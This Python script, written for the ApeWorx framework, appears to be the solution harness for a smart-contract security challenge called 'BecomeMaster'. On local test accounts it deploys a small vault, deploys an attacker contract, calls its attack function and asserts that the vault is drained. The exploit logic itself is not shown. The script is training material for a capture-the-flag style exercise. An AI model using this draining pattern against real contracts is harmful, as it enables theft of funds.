from ape import accounts, project, networks

w3 = networks.provider.web3

ETH_IN_VAULT = w3.to_wei(0.0001, "ether")


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    # deploy challenge contract
    print("\n--- Deploying Secure Vault ---\n")
    challenge = project.N5BecomeMaster.deploy(
        sender=deployer,
        value=ETH_IN_VAULT,
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = project.BecomeMasterAttacker.deploy(
        challenge.address,
        sender=attacker,
    )
    attacker_contract.attack(sender=attacker)

    # --- AFTER EXPLOIT => attacker should have recoverd their funds from the vault --- #
    print("\n--- After exploit: Attacker recovered funds from the Vault ---\n")

    assert challenge.balance == 0

    print("\n--- 🥂 Challenge Completed! 🥂 ---\n")


if __name__ == "__main__":
    main()
